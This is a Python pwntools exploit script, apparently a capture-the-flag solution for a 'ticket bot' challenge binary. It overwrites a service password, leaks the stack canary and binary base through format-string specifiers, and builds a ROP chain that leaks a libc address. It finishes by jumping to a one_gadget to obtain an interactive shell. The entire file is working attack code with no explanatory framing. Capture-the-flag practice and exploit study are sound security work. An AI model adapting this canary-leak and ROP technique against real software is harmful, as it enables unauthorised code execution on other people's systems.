#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was a modification of the original template via:
# $ pwn template
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *adminpass+102
'''.format(**locals())

# Set up pwntools for the correct files
exe = './chal_patched'
elf = context.binary = ELF(exe)
libc = elf.libc

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Step 1 --- Overwrite password

for _ in range(5):
    io.sendline(b"A")
    io.sendline(b"1")  # New Ticket

io.sendline(b"AAAABBBB")
password = 0x42424242

# Step 2 --- Leak canary

io.sendline(b"3")  # Service Login
io.sendline(str(password).encode())

io.sendline(b"1")
io.sendline(b"%7$p")

io.recvline_contains(b"Password changed to")
canary = int(io.recvuntil(b"=", drop=True), 16)
print(f"Canary: {hex(canary)}")

# --- The rest is pretty the same as ticket bot v1 ---

# Step 3 --- Leak binary address

io.sendline(b"3")
io.sendline(str(password).encode())

io.sendline(b"1")
io.sendline(b"%9$p")

io.recvline_contains(b"Password changed to")
elf.address = int(io.recvuntil(b"=", drop=True), 16) - \
    (elf.symbols["AdminMenu"]+129)
print(f"Base address: {hex(elf.address)}")

# Step 4 --- Leak libc address and jump back to AdminMenu

rop = ROP(elf)
rop.raw(b"AAAAAAAA")
rop.raw(canary)
rop.raw(b"BBBBBBBB")
rop.call(elf.plt["puts"], (elf.got["printf"], ))  # leak libc address
rop.call(elf.symbols["adminpass"])

print(rop.dump())

io.sendline(b"3")
io.sendline(str(password).encode())

io.sendline(b"1")
io.sendline(rop.chain())

io.recvuntil(b"AAAA")
libc.address = unpack(io.recvn(6) + b"\x00\x00") - libc.symbols["printf"]
print(f"Libc address: {hex(libc.address)}")

# Step 5 --- Jump to one_gadget

io.sendline(flat(
    b"AAAAAAAA",
    canary,
    b"BBBBBBBB",
    libc.address + 0xe3b01  # one_gadget
))

io.interactive()
